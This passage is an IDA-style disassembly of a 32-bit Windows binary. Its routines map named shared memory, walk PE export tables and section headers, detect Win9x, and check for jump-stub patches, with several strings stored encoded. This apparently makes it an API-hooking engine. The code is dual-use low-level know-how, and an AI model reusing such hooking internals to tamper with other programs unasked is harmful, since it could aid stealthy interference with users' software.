		push	0FFFFFFFFh
		lea	edx, [ebp+var_34]
		mov	eax, offset dword_40E870
		call	sub_4064CC
		lea	eax, [ebp+var_34]
		push	eax
		lea	edx, [ebp+var_38]
		mov	eax, offset dword_40E894
		call	sub_4064CC
		mov	edx, [ebp+var_38]
		pop	eax
		call	sub_403C2C
		mov	eax, [ebp+var_34]
		call	sub_403E24
		push	eax
		call	sub_40C508
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0
		jz	loc_40E817
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		mov	eax, [ebp+hObject]
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	[ebp+lpBaseAddress], eax
		cmp	[ebp+lpBaseAddress], 0
		jz	loc_40E80E
		mov	eax, [ebp+lpBaseAddress]
		mov	eax, [eax]
		mov	[ebp+var_24], eax
		mov	[ebp+var_19], 1
		mov	eax, [ebp+var_24]
		mov	eax, [eax]
		dec	eax
		test	eax, eax
		jl	loc_40E7DF
		inc	eax
		mov	[ebp+var_28], eax
		mov	[ebp+var_20], 0

loc_40E74F:				; CODE XREF: sub_40E63C+19Dj
		mov	eax, [ebp+var_20]
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+var_24]
		mov	edx, [edx+4]
		lea	ebx, [edx+eax*8]
		mov	dl, 1
		mov	esi, [ebx+10h]
		dec	esi
		test	esi, esi
		jl	short loc_40E7AB
		inc	esi
		xor	eax, eax

loc_40E76B:				; CODE XREF: sub_40E63C+16Dj
		lea	ecx, [eax+eax*2]
		mov	edi, [ebx+14h]
		lea	edi, [edi+ecx*4]
		mov	ecx, [ebx]
		cmp	ecx, [ebp+var_8]
		jnz	short loc_40E799
		mov	ecx, [edi]
		cmp	ecx, [ebp+var_4]
		jnz	short loc_40E799
		mov	ecx, [edi+8]
		cmp	ecx, [ebp+var_C]
		jnz	short loc_40E799
		lea	ecx, [eax+eax*2]
		mov	edi, [ebx+14h]
		mov	dword ptr [edi+ecx*4], 0
		jmp	short loc_40E7A7
; ---------------------------------------------------------------------------

loc_40E799:				; CODE XREF: sub_40E63C+13Dj
					; sub_40E63C+144j ...
		lea	ecx, [eax+eax*2]
		mov	edi, [ebx+14h]
		cmp	dword ptr [edi+ecx*4], 0
		jz	short loc_40E7A7
		xor	edx, edx

loc_40E7A7:				; CODE XREF: sub_40E63C+15Bj
					; sub_40E63C+167j
		inc	eax
		dec	esi
		jnz	short loc_40E76B

loc_40E7AB:				; CODE XREF: sub_40E63C+12Aj
		test	dl, dl
		jz	short loc_40E7C9
		mov	eax, [ebx+14h]
		test	eax, eax
		jz	short loc_40E7BD
		push	eax
		call	ds:dword_416A54

loc_40E7BD:				; CODE XREF: sub_40E63C+178j
		xor	eax, eax
		mov	[ebx+10h], eax
		xor	eax, eax
		mov	[ebx+14h], eax
		jmp	short loc_40E7D3
; ---------------------------------------------------------------------------

loc_40E7C9:				; CODE XREF: sub_40E63C+171j
		cmp	dword ptr [ebx+10h], 0
		jle	short loc_40E7D3
		mov	[ebp+var_19], 0

loc_40E7D3:				; CODE XREF: sub_40E63C+18Bj
					; sub_40E63C+191j
		inc	[ebp+var_20]
		dec	[ebp+var_28]
		jnz	loc_40E74F

loc_40E7DF:				; CODE XREF: sub_40E63C+102j
		cmp	[ebp+var_19], 0
		jz	short loc_40E805
		mov	eax, [ebp+var_24]
		mov	eax, [eax+4]
		test	eax, eax
		jz	short loc_40E7F6
		push	eax
		call	ds:dword_416A54

loc_40E7F6:				; CODE XREF: sub_40E63C+1B1j
		mov	eax, [ebp+var_24]
		xor	edx, edx
		mov	[eax], edx
		mov	eax, [ebp+var_24]
		xor	edx, edx
		mov	[eax+4], edx

loc_40E805:				; CODE XREF: sub_40E63C+1A7j
		mov	eax, [ebp+lpBaseAddress]
		push	eax		; lpBaseAddress
		call	UnmapViewOfFile

loc_40E80E:				; CODE XREF: sub_40E63C+E8j
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle

loc_40E817:				; CODE XREF: sub_40E63C+C7j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40E835

loc_40E824:				; CODE XREF: sub_40E63C+1F7j
		mov	eax, [ebp+hMutex]
		push	eax		; hMutex
		call	ReleaseMutex
		retn
; ---------------------------------------------------------------------------

loc_40E82E:				; DATA XREF: sub_40E63C+7Eo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40E824
; ---------------------------------------------------------------------------

loc_40E835:				; CODE XREF: sub_40E63C+1F1j
					; DATA XREF: sub_40E63C+1E3o
		mov	eax, [ebp+hMutex]
		push	eax		; hObject
		call	CloseHandle

loc_40E83E:				; CODE XREF: sub_40E63C+6Aj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40E860

loc_40E84B:				; CODE XREF: sub_40E63C+222j
		lea	eax, [ebp+var_38]
		mov	edx, 4
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40E859:				; DATA XREF: sub_40E63C+23o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40E84B
; ---------------------------------------------------------------------------

loc_40E860:				; CODE XREF: sub_40E63C+21Cj
					; DATA XREF: sub_40E63C+20Ao
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40E63C	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 8
dword_40E870	dd 61D1438h, 26372021h,	0 ; DATA XREF: sub_40E63C+31o
					; sub_40E63C+8Eo
		dd 0FFFFFFFFh, 5
dword_40E884	dd 30212018h, 2Dh, 0FFFFFFFFh, 3 ; DATA	XREF: sub_40E63C+42o
dword_40E894	dd 253418h		; DATA XREF: sub_40E63C+9Fo
off_40E898	dd offset dword_40E8E4	; DATA XREF: sub_410970+96r
					; sub_410970+BDr
		dd 7 dup(0)
		dd offset dword_40E8E4
		dd 34h
		dd offset off_401024
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_4102F8
dword_40E8E4	dd 6F435409h, 6F486564h, 0C08B6B6Fh ; DATA XREF: CODE:off_40E898o
					; CODE:0040E8B8o
dword_40E8F0	dd 50515257h, 111111BFh, 24548B11h, 118B910h, 0C0310000h
					; DATA XREF: sub_40F0A4+B3o
					; sub_40F0A4+C40o
		dd 57B10FF0h, 83097401h, 0C0310EC7h, 4EBF2E2h, 10247C89h
		dd 5F5A5958h, 222222E9h, 0C08BC322h
off_40E924	dd offset dword_40E928	; DATA XREF: sub_40E94C+13Fr
					; sub_40E94C+39Dr
dword_40E928	dd 382E0311h, 4034h	; DATA XREF: CODE:off_40E924o
		db 0
		dd offset off_407188
		db 3 dup(0FFh)
		db 0FFh
		dd offset off_407188
		db 0Bh,	6Dh, 61h
		dd 646F4364h, 6F6F4865h, 408D6Bh

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40E94C	proc near		; CODE XREF: sub_40ED30+47p
					; sub_40ED30+67p ...

var_7C		= byte ptr -7Ch
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
lpBaseAddress	= dword	ptr -28h
var_21		= byte ptr -21h
hObject		= dword	ptr -20h
var_19		= byte ptr -19h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_5		= byte ptr -5
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	ecx, 0Fh

loc_40E954:				; CODE XREF: sub_40E94C+Dj
		push	0
		push	0
		dec	ecx
		jnz	short loc_40E954
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	edi, edx
		mov	[ebp+var_4], eax
		mov	eax, [ebp+var_4]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_40ECFD
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	[ebp+var_5], 0
		mov	eax, [ebp+var_4]
		call	sub_403E24
		push	eax		; lpModuleName
		call	GetModuleHandleA_0
		mov	edx, [ebp+arg_0]
		cmp	eax, [edx-4]
		jnz	loc_40ECBB
		cmp	dword ptr [edi], 0
		jnz	loc_40EC94
		lea	edx, [ebp+var_2C]
		mov	eax, offset dword_40ED18
		call	sub_4064CC
		push	[ebp+var_2C]
		push	offset dword_40ED2C
		push	[ebp+var_4]
		lea	eax, [ebp+var_3C]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_3C]
		call	sub_403E24
		push	eax		; lpName
		push	10h		; dwMaximumSizeLow
		push	0		; dwMaximumSizeHigh
		push	4		; flProtect
		push	0		; lpFileMappingAttributes
		push	0FFFFFFFFh	; hFile
		call	CreateFileMappingA
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0
		jz	loc_40EC94
		call	GetLastError
		cmp	eax, 0B7h
		setnz	[ebp+var_21]
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		mov	eax, [ebp+hObject]
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	[ebp+lpBaseAddress], eax
		cmp	[ebp+lpBaseAddress], 0
		jz	loc_40EC8B
		mov	ebx, 32h

loc_40EA1F:				; CODE XREF: sub_40E94C+F5j
		cmp	[ebp+var_21], 0
		jnz	short loc_40EA43
		mov	eax, [ebp+lpBaseAddress]
		mov	edx, [eax+4]
		mov	eax, [eax]
		mov	ecx, [ebp+var_2C]
		cmp	edx, [ecx+4]
		jnz	short loc_40EA39
		cmp	eax, [ecx]
		jz	short loc_40EA43

loc_40EA39:				; CODE XREF: sub_40E94C+E7j
		push	32h		; dwMilliseconds
		call	Sleep
		dec	ebx
		jnz	short loc_40EA1F

loc_40EA43:				; CODE XREF: sub_40E94C+D7j
					; sub_40E94C+EBj
		cmp	[ebp+var_21], 0
		jnz	short loc_40EA61
		mov	eax, [ebp+lpBaseAddress]
		mov	edx, [eax+4]
		mov	eax, [eax]
		mov	ecx, [ebp+var_2C]
		cmp	edx, [ecx+4]
		jnz	short loc_40EA5B
		cmp	eax, [ecx]

loc_40EA5B:				; CODE XREF: sub_40E94C+10Bj
		jz	loc_40EC4C

loc_40EA61:				; CODE XREF: sub_40E94C+FBj
		xor	eax, eax
		mov	[ebp+var_14], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-4]
		call	sub_406854
		test	eax, eax
		jz	loc_40EBEF
		mov	[ebp+var_30], eax
		mov	eax, [ebp+var_30]
		mov	eax, [eax+14h]
		push	eax
		lea	eax, [ebp+var_18]
		mov	ecx, 1
		mov	edx, off_40E924
		call	sub_404718
		add	esp, 4
		mov	eax, [ebp+var_30]
		mov	eax, [eax+14h]
		push	eax
		mov	eax, edi
		mov	ecx, 1
		mov	edx, off_405490
		call	sub_404718
		add	esp, 4
		mov	eax, [ebp+var_30]
		mov	esi, [eax+14h]
		dec	esi
		test	esi, esi
		jl	short loc_40EAFD
		inc	esi
		xor	ebx, ebx

loc_40EAC3:				; CODE XREF: sub_40E94C+1AFj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-4]
		mov	edx, [ebp+var_30]
		add	eax, [edx+1Ch]
		mov	eax, [eax+ebx*4]
		mov	edx, [ebp+arg_0]
		add	eax, [edx-4]
		lea	edx, [ebp+var_7C]
		call	sub_4097C0
		lea	edx, [ebp+var_7C]
		mov	eax, ebx
		shl	eax, 3
		mov	ecx, [ebp+var_18]
		lea	eax, [ecx+eax*8]
		mov	ecx, off_407188
		call	sub_4041F8
		inc	ebx
		dec	esi
		jnz	short loc_40EAC3

loc_40EAFD:				; CODE XREF: sub_40E94C+172j
		mov	eax, [ebp+var_18]
		call	sub_404564
		mov	esi, eax
		test	esi, esi
		jl	loc_40EBEF
		inc	esi
		xor	ebx, ebx

loc_40EB12:				; CODE XREF: sub_40E94C+29Dj
		mov	eax, ebx
		shl	eax, 3
		mov	edx, [ebp+var_18]
		cmp	byte ptr [edx+eax*8], 0
		jz	loc_40EBE7
		mov	edx, [ebp+var_18]
		cmp	byte ptr [edx+eax*8+28h], 0
		jz	loc_40EBE7
		mov	[ebp+var_19], 0
		mov	eax, [ebp+var_18]
		call	sub_404564
		test	eax, eax
		jl	loc_40EBE7
		inc	eax
		mov	[ebp+var_34], eax
		mov	[ebp+var_C], 0

loc_40EB51:				; CODE XREF: sub_40E94C+295j
		cmp	ebx, [ebp+var_C]
		jz	loc_40EBDB
		mov	eax, [ebp+var_C]
		shl	eax, 3
		mov	edx, [ebp+var_18]
		mov	eax, [edx+eax*8+1Ch]
		call	sub_404564
		test	eax, eax
		jl	short loc_40EBD5
		inc	eax
		mov	[ebp+var_38], eax
		mov	[ebp+var_10], 0

loc_40EB7B:				; CODE XREF: sub_40E94C+287j
		mov	eax, [ebp+var_C]
		shl	eax, 3
		mov	edx, [ebp+var_18]
		mov	eax, [edx+eax*8+1Ch]
		mov	edx, [ebp+var_10]
		add	edx, edx
		lea	edx, [edx+edx*2]
		mov	eax, [eax+edx*8]
		mov	edx, ebx
		shl	edx, 3
		mov	ecx, [ebp+var_18]
		cmp	eax, [ecx+edx*8+4]
		jbe	short loc_40EBCD
		mov	edx, ebx
		shl	edx, 3
		mov	ecx, [ebp+var_18]
		mov	edx, [ecx+edx*8+4]
		add	edx, 6
		cmp	eax, edx
		jnb	short loc_40EBCD
		mov	eax, ebx
		shl	eax, 3
		mov	edx, [ebp+var_18]
		mov	eax, [edx+eax*8+4]
		mov	edx, [edi]
		mov	ecx, [ebp+var_14]
		mov	[edx+ecx*4], eax
		inc	[ebp+var_14]
		jmp	short loc_40EBD5
; ---------------------------------------------------------------------------

loc_40EBCD:				; CODE XREF: sub_40E94C+253j
					; sub_40E94C+266j
		inc	[ebp+var_10]
		dec	[ebp+var_38]
		jnz	short loc_40EB7B

loc_40EBD5:				; CODE XREF: sub_40E94C+222j
					; sub_40E94C+27Fj
		cmp	[ebp+var_19], 0
		jnz	short loc_40EBE7

loc_40EBDB:				; CODE XREF: sub_40E94C+208j
		inc	[ebp+var_C]
		dec	[ebp+var_34]
		jnz	loc_40EB51

loc_40EBE7:				; CODE XREF: sub_40E94C+1D2j
					; sub_40E94C+1E0j ...
		inc	ebx
		dec	esi
		jnz	loc_40EB12

loc_40EBEF:				; CODE XREF: sub_40E94C+127j
					; sub_40E94C+1BDj
		mov	eax, [ebp+var_14]
		push	eax
		mov	eax, edi
		mov	ecx, 1
		mov	edx, off_405490
		call	sub_404718
		add	esp, 4
		mov	eax, [ebp+lpBaseAddress]
		mov	edx, [ebp+var_14]
		mov	[eax+8], edx
		push	0
		mov	esi, [ebp+var_14]
		shl	esi, 2
		push	esi
		call	sub_40A770
		mov	ebx, eax
		mov	eax, [ebp+lpBaseAddress]
		mov	[eax+0Ch], ebx
		mov	ecx, esi
		mov	edx, ebx
		mov	eax, [edi]
		call	sub_402664
		mov	edx, [ebp+lpBaseAddress]
		mov	ecx, 8
		mov	eax, [ebp+var_2C]
		call	sub_40C1B0
		mov	eax, [ebp+hObject]
		call	sub_40A660
		jmp	short loc_40EC82
; ---------------------------------------------------------------------------

loc_40EC4C:				; CODE XREF: sub_40E94C:loc_40EA5Bj
		mov	eax, [ebp+lpBaseAddress]
		mov	ebx, [eax+8]
		test	ebx, ebx
		jle	short loc_40EC82
		push	ebx
		mov	eax, edi
		mov	ecx, 1
		mov	edx, off_405490
		call	sub_404718
		add	esp, 4
		mov	eax, [ebp+lpBaseAddress]
		mov	ecx, [eax+8]
		shl	ecx, 2
		mov	edx, [edi]
		mov	eax, [ebp+lpBaseAddress]
		mov	eax, [eax+0Ch]
		call	sub_402664

loc_40EC82:				; CODE XREF: sub_40E94C+2FEj
					; sub_40E94C+308j
		mov	eax, [ebp+lpBaseAddress]
		push	eax		; lpBaseAddress
		call	UnmapViewOfFile

loc_40EC8B:				; CODE XREF: sub_40E94C+C8j
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle

loc_40EC94:				; CODE XREF: sub_40E94C+4Fj
					; sub_40E94C+99j
		mov	eax, [edi]
		call	sub_404564
		mov	esi, eax
		test	esi, esi
		jl	short loc_40ECBB
		inc	esi
		xor	ebx, ebx

loc_40ECA4:				; CODE XREF: sub_40E94C+36Dj
		mov	eax, [edi]
		mov	eax, [eax+ebx*4]
		mov	edx, [ebp+arg_0]
		cmp	eax, [edx-8]
		jnz	short loc_40ECB7
		mov	[ebp+var_5], 1
		jmp	short loc_40ECBB
; ---------------------------------------------------------------------------

loc_40ECB7:				; CODE XREF: sub_40E94C+363j
		inc	ebx
		dec	esi
		jnz	short loc_40ECA4

loc_40ECBB:				; CODE XREF: sub_40E94C+46j
					; sub_40E94C+353j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40ED04

loc_40ECC8:				; CODE XREF: sub_40E94C+3B6j
		lea	eax, [ebp+var_7C]
		mov	edx, off_407188
		call	sub_40409C
		lea	eax, [ebp+var_3C]
		call	sub_403994
		lea	eax, [ebp+var_2C]
		call	sub_403994
		lea	eax, [ebp+var_18]
		mov	edx, off_40E924
		call	sub_404724
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_40ECFD:				; DATA XREF: sub_40E94C+23o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40ECC8
; ---------------------------------------------------------------------------

loc_40ED04:				; CODE XREF: sub_40E94C+3B0j
					; DATA XREF: sub_40E94C+377o
		mov	al, [ebp+var_5]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40E94C	endp

; ---------------------------------------------------------------------------
		align 10h
		dd 0FFFFFFFFh, 8
dword_40ED18	dd 1C3D3638h, 14182D6Ch, 0 ; DATA XREF:	sub_40E94C+58o
		dd 0FFFFFFFFh, 1
dword_40ED2C	dd 2Eh			; DATA XREF: sub_40E94C+65o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40ED30	proc near		; CODE XREF: sub_40F0A4+36Dp

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ebx
		mov	[ebp+var_8], edx
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_40EDE2
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40EDC1
		cmp	[ebp+var_4], 0
		jz	short loc_40EDC1
		push	ebp
		lea	edx, [ebp+var_C]
		mov	eax, offset dword_40EDF8
		call	sub_4064CC
		mov	eax, [ebp+var_C]
		mov	edx, offset dword_4176CC
		call	sub_40E94C
		pop	ecx
		test	al, al
		jnz	short loc_40EDC5
		push	ebp
		lea	edx, [ebp+var_10]
		mov	eax, offset dword_40EE0C
		call	sub_4064CC
		mov	eax, [ebp+var_10]
		mov	edx, offset dword_4176D0
		call	sub_40E94C
		pop	ecx
		test	al, al
		jnz	short loc_40EDC5
		push	ebp
		lea	edx, [ebp+var_14]
		mov	eax, offset dword_40EE20
		call	sub_4064CC
		mov	eax, [ebp+var_14]
		mov	edx, offset dword_4176D4
		call	sub_40E94C
		pop	ecx
		test	al, al
		jnz	short loc_40EDC5

loc_40EDC1:				; CODE XREF: sub_40ED30+29j
					; sub_40ED30+2Fj
		xor	ebx, ebx
		jmp	short loc_40EDC7
; ---------------------------------------------------------------------------

loc_40EDC5:				; CODE XREF: sub_40ED30+4Fj
					; sub_40ED30+6Fj ...
		mov	bl, 1

loc_40EDC7:				; CODE XREF: sub_40ED30+93j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40EDE9

loc_40EDD4:				; CODE XREF: sub_40ED30+B7j
		lea	eax, [ebp+var_14]
		mov	edx, 3
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40EDE2:				; DATA XREF: sub_40ED30+14o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40EDD4
; ---------------------------------------------------------------------------

loc_40EDE9:				; CODE XREF: sub_40ED30+B1j
					; DATA XREF: sub_40ED30+9Fo
		mov	eax, ebx
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40ED30	endp

; ---------------------------------------------------------------------------
		dd 0FFFFFFFFh, 9
dword_40EDF8	dd 663C3132h, 39317B67h, 39h, 0FFFFFFFFh, 0Ah ;	DATA XREF: sub_40ED30+35o
dword_40EE0C	dd 27302620h, 317B6766h, 3939h,	0FFFFFFFFh, 0Ah	; DATA XREF: sub_40ED30+55o
dword_40EE20	dd 3C253421h, 317B6766h, 3939h ; DATA XREF: sub_40ED30+75o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40EE2C	proc near		; CODE XREF: sub_40F0A4+336p

var_5C		= byte ptr -5Ch
var_38		= dword	ptr -38h
var_34		= byte ptr -34h
var_32		= word ptr -32h
var_2E		= byte ptr -2Eh
var_2C		= dword	ptr -2Ch
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_9		= byte ptr -9
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFA4h
		push	ebx
		push	esi
		push	edi
		xor	ebx, ebx
		mov	[ebp+var_38], ebx
		mov	[ebp+var_8], ecx
		mov	[ebp+var_4], edx
		mov	ebx, eax
		mov	eax, [ebp+var_4]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_40EFB0
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	[ebp+var_9], 0
		call	GetVersion_0
		test	eax, 80000000h
		jz	loc_40EF92
		test	ebx, ebx
		jz	loc_40EF92
		cmp	[ebp+var_4], 0
		jz	loc_40EF92
		call	sub_4097D4
		cmp	ebx, eax
		jz	short loc_40EEAA
		lea	edx, [ebp+var_38]
		mov	eax, offset dword_40EFCC
		call	sub_4064CC
		mov	eax, [ebp+var_38]
		call	sub_403E24
		push	eax		; lpModuleName
		call	GetModuleHandleA_0
		cmp	ebx, eax
		jnz	loc_40EF92

loc_40EEAA:				; CODE XREF: sub_40EE2C+59j
		mov	eax, ebx
		call	sub_406854
		test	eax, eax
		jz	short loc_40EEE9
		mov	esi, eax
		xor	eax, eax
		mov	[ebp+var_10], eax
		mov	eax, [esi+14h]
		dec	eax
		test	eax, eax
		jl	short loc_40EEE9
		inc	eax
		xor	edx, edx

loc_40EEC7:				; CODE XREF: sub_40EE2C+BBj
		mov	ecx, [esi+1Ch]
		add	ecx, ebx
		mov	ecx, [ecx+edx*4]
		add	ecx, ebx
		cmp	ecx, [ebp+var_8]
		jnz	short loc_40EEE5
		inc	[ebp+var_10]
		cmp	[ebp+var_10], 3
		jle	short loc_40EEE5
		mov	[ebp+var_9], 1
		jmp	short loc_40EEE9
; ---------------------------------------------------------------------------

loc_40EEE5:				; CODE XREF: sub_40EE2C+A8j
					; sub_40EE2C+B1j
		inc	edx
		dec	eax
		jnz	short loc_40EEC7

loc_40EEE9:				; CODE XREF: sub_40EE2C+87j
					; sub_40EE2C+96j ...
		cmp	[ebp+var_9], 0
		jnz	loc_40EF92
		lea	edx, [ebp+var_34]
		mov	eax, [ebp+var_8]
		call	sub_408610
		lea	edx, [ebp+var_5C]
		mov	eax, [ebp+var_14]
		call	sub_408610
		lea	esi, [ebp+var_5C]
		lea	edi, [ebp+var_34]
		mov	ecx, 9
		rep movsd
		cmp	[ebp+var_32], 0B1h
		jnz	short loc_40EF92
		lea	edx, [ebp+var_5C]
		mov	eax, [ebp+var_14]
		call	sub_408610
		lea	esi, [ebp+var_5C]
		lea	edi, [ebp+var_34]
		mov	ecx, 9
		rep movsd
		xor	eax, eax
		push	ebp
		push	offset loc_40EF88
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	[ebp+var_2E], 0
		jz	short loc_40EF75
		cmp	[ebp+var_2C], 0
		jz	short loc_40EF75
		mov	eax, [ebp+var_2C]
		cmp	word ptr [eax],	25FFh
		jnz	short loc_40EF75
		call	sub_4097D4
		mov	edx, 11h
		call	sub_406B50
		mov	edx, [ebp+var_2C]
		add	edx, 2
		mov	edx, [edx]
		cmp	eax, [edx]
		jz	short loc_40EF79

loc_40EF75:				; CODE XREF: sub_40EE2C+11Cj
					; sub_40EE2C+122j ...
		xor	eax, eax
		jmp	short loc_40EF7B
; ---------------------------------------------------------------------------

loc_40EF79:				; CODE XREF: sub_40EE2C+147j
		mov	al, 1

loc_40EF7B:				; CODE XREF: sub_40EE2C+14Bj
		mov	[ebp+var_9], al
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_40EF92
; ---------------------------------------------------------------------------

loc_40EF88:				; DATA XREF: sub_40EE2C+10Do
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4033E8

loc_40EF92:				; CODE XREF: sub_40EE2C+3Aj
					; sub_40EE2C+42j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40EFB7

loc_40EF9F:				; CODE XREF: sub_40EE2C+189j
		lea	eax, [ebp+var_38]
		call	sub_403994
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_40EFB0:				; DATA XREF: sub_40EE2C+21o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40EF9F
; ---------------------------------------------------------------------------

loc_40EFB7:				; CODE XREF: sub_40EE2C+183j
					; DATA XREF: sub_40EE2C+16Eo
		mov	al, [ebp+var_9]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40EE2C	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 0Ah
dword_40EFCC	dd 27302620h, 317B6766h, 3939h ; DATA XREF: sub_40EE2C+5Eo

; =============== S U B	R O U T	I N E =======================================


sub_40EFD8	proc near		; CODE XREF: sub_40F0A4+3AEp
					; sub_40F0A4+47Ep
		push	ebx
		push	esi
		push	edi
		push	ebp
		push	ecx
		mov	edi, edx
		mov	esi, eax
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40F047
		cmp	edi, 80000000h
		setnb	bl
		test	bl, bl
		jnz	short loc_40F049
		test	esi, esi
		jz	short loc_40F049
		mov	eax, esi
		call	sub_4067D4
		mov	edx, eax
		test	edx, edx
		jz	short loc_40F049
		mov	ebp, edx
		add	ebp, 0F8h
		mov	eax, ebp
		movzx	edx, word ptr [edx+6]
		dec	edx
		test	edx, edx
		jl	short loc_40F049
		inc	edx

loc_40F01F:				; CODE XREF: sub_40EFD8+6Bj
		mov	ecx, [eax+0Ch]
		add	ecx, esi
		mov	ebp, edi
		cmp	ecx, ebp
		ja	short loc_40F03F
		mov	ecx, [eax+0Ch]
		add	ecx, esi
		add	ecx, [eax+10h]
		cmp	ebp, ecx
		jnb	short loc_40F03F
		test	byte ptr [eax+27h], 10h
		setnz	bl
		jmp	short loc_40F049
; ---------------------------------------------------------------------------

loc_40F03F:				; CODE XREF: sub_40EFD8+50j
					; sub_40EFD8+5Cj
		add	eax, 28h
		dec	edx
		jnz	short loc_40F01F
		jmp	short loc_40F049
; ---------------------------------------------------------------------------

loc_40F047:				; CODE XREF: sub_40EFD8+13j
		xor	ebx, ebx

loc_40F049:				; CODE XREF: sub_40EFD8+20j
					; sub_40EFD8+24j ...
		mov	eax, ebx
		pop	edx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_40EFD8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40F054	proc near		; CODE XREF: sub_40F0A4+286p
					; sub_40F0A4+2E9p
		push	ebx
		push	esi
		mov	ebx, eax
		cmp	dword ptr [ebx], 0
		jz	short loc_40F09B
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		mov	eax, [ebx]
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	esi, eax
		test	esi, esi
		jz	short loc_40F08F
		cmp	dword ptr [esi], 0
		jnz	short loc_40F087
		mov	eax, [ebx]
		push	eax		; hObject
		call	CloseHandle
		xor	eax, eax
		mov	[ebx], eax

loc_40F087:				; CODE XREF: sub_40F054+25j
		push	esi		; lpBaseAddress
		call	UnmapViewOfFile
		jmp	short loc_40F09B
; ---------------------------------------------------------------------------

loc_40F08F:				; CODE XREF: sub_40F054+20j
		mov	eax, [ebx]
		push	eax		; hObject
		call	CloseHandle
		xor	eax, eax
		mov	[ebx], eax

loc_40F09B:				; CODE XREF: sub_40F054+7j
					; sub_40F054+39j
		cmp	dword ptr [ebx], 0
		setnz	al
		pop	esi
		pop	ebx
		retn
sub_40F054	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40F0A4	proc near		; CODE XREF: sub_410970+9Bp
					; sub_410970+C2p

var_188		= dword	ptr -188h
var_184		= dword	ptr -184h
var_180		= dword	ptr -180h
var_17C		= dword	ptr -17Ch
var_120		= dword	ptr -120h
